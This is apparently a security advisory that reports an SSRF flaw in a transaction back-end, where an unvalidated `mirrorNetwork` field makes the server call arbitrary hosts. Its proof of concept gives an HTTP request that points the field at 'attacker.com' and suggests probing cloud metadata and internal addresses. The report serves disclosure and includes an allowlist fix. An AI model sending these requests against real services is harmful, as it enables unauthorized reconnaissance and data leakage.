### Title
Server-Side Request Forgery (SSRF) via Unvalidated `mirrorNetwork` Field in Transaction Submission

### Summary
Any authenticated user can submit a transaction with an arbitrary `mirrorNetwork` value (e.g., `"attacker.com"`). The back-end stores this value without allowlist validation and later uses it to construct HTTP URLs for mirror node queries. Because `MirrorNodeREST.fromBaseURL()` passes unrecognized values directly into `https://${mirrorNetwork}`, the server makes outbound HTTP requests to attacker-controlled endpoints, constituting a Server-Side Request Forgery (SSRF).

### Finding Description

**Root cause — no allowlist on `mirrorNetwork` in `CreateTransactionDto`:**

`mirrorNetwork` is only validated as `@IsNotEmpty()` and `@IsString()`. Any arbitrary hostname is accepted and persisted. [1](#0-0) 

**Vulnerable URL construction — `MirrorNodeREST.fromBaseURL()` default branch:**

When `mirrorNetwork` does not match `mainnet`, `testnet`, `previewnet`, or `local-node`, the value is interpolated directly into a URL with no sanitization:

```typescript
default:
  return `https://${mirrorNetwork}`;
``` [2](#0-1) 

**HTTP request execution — `MirrorNodeClient.fetchAccountInfo()`:**

The constructed URL is used to make a live HTTP GET request:

```typescript
const url = `${this.getMirrorNodeRESTURL(mirrorNetwork)}/accounts/${accountId}`;
const response = await this.fetchWithRetry<AccountInfo>(url, etag);
``` [3](#0-2) 

**Trigger path — `AccountCacheService` uses the stored `mirrorNetwork` directly:**

`getAccountInfoForTransaction()` reads `transaction.mirrorNetwork` and passes it to `fetchAndSaveAccountInfo()` → `mirrorNodeClient.fetchAccountInfo()`: [4](#0-3) 

**Second trigger — background cron job `refreshStaleAccounts()`:**

The chain service's cache management cron job iterates over all stale `CachedAccount` rows, grouping them by `account.mirrorNetwork`, and calls `refreshAccount()` for each — again using the stored attacker-controlled value: [5](#0-4) 

**End-to-end exploit flow:**
1. Attacker authenticates and submits `POST /transactions` with `mirrorNetwork: "attacker.com"`.
2. The value passes `@IsString()` / `@IsNotEmpty()` validation and is persisted to the `Transaction` table.
3. During transaction processing, `getAccountInfoForTransaction(transaction, accountId)` is called with `transaction.mirrorNetwork = "attacker.com"`.
4. `MirrorNodeREST.fromBaseURL("attacker.com")` returns `"https://attacker.com"`.
5. The server issues `GET https://attacker.com/api/v1/accounts/{accountId}`.
6. The attacker's server receives the request, logging the server's egress IP and the Hedera account IDs being queried.
7. The cron job in `refreshStaleAccounts()` repeats this for every stale `CachedAccount` associated with the attacker's transaction.

### Impact Explanation
- **Server IP disclosure**: The attacker learns the back-end server's egress IP address.
- **Account ID exfiltration**: The attacker observes which Hedera account IDs the server queries (payer accounts, receiver accounts, etc.).
- **Internal network probing**: By supplying values like `169.254.169.254` (AWS metadata), `10.0.0.1`, or internal service hostnames, the attacker can probe internal infrastructure not exposed to the internet. The server will make repeated requests (with retry logic up to 3 attempts) to any host the attacker specifies.
- **Persistent SSRF**: The cron job `refreshStaleAccounts()` will continue issuing requests to the attacker-controlled host for as long as the `CachedAccount` row exists, making this a persistent rather than one-shot SSRF.

### Likelihood Explanation
Any registered user can trigger this. No admin or privileged role is required — only a valid JWT token to call `POST /transactions`. The `mirrorNetwork` field is explicitly designed to accept custom values (the front-end even has a "Custom Node" UI that sets arbitrary hostnames), so there is no existing server-side guard. The cron-based re-trigger means a single malicious transaction submission causes repeated outbound requests.

### Recommendation
Enforce an allowlist for `mirrorNetwork` at the DTO validation layer. Add a custom validator or use `@IsIn()` to restrict accepted values to the known set (`mainnet`, `testnet`, `previewnet`, `local-node`). If custom mirror nodes must be supported, validate the hostname against a configurable allowlist of trusted domains before persisting or using the value.

```typescript
// Example fix in create-transaction.dto.ts
@IsNotEmpty()
@IsString()
@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])
mirrorNetwork: string;
```

Alternatively, in `MirrorNodeREST.fromBaseURL()`, throw an error in the `default` branch rather than constructing an arbitrary URL.

### Proof of Concept

**Precondition**: Attacker has a valid user account and JWT token. Attacker controls `attacker.com` and runs an HTTP server logging all incoming requests.

**Step 1** — Submit a transaction with a malicious `mirrorNetwork`:
```http
POST /transactions HTTP/1.1
Authorization: Bearer <valid_jwt>
Content-Type: application/json

{
  "name": "test",
  "description": "test",
  "transactionBytes": "<valid_hex_encoded_transaction_bytes>",
  "creatorKeyId": <valid_key_id>,
  "signature": "<valid_signature_hex>",
  "mirrorNetwork": "attacker.com"
}
```

**Step 2** — The server processes the transaction. `AccountCacheService.getAccountInfoForTransaction()` is called with `mirrorNetwork = "attacker.com"`. `MirrorNodeREST.fromBaseURL("attacker.com")` returns `"https://attacker.com"`. The server issues:
```
GET https://attacker.com/api/v1/accounts/0.0.XXXX
```

**Step 3** — The attacker's HTTP server logs the request, revealing:
- The server's egress IP address
- The Hedera account ID (`0.0.XXXX`) being queried

**Step 4** — The `refreshStaleAccounts()` cron job continues issuing the same request periodically until the `CachedAccount` row is removed, providing persistent SSRF without any further attacker action.
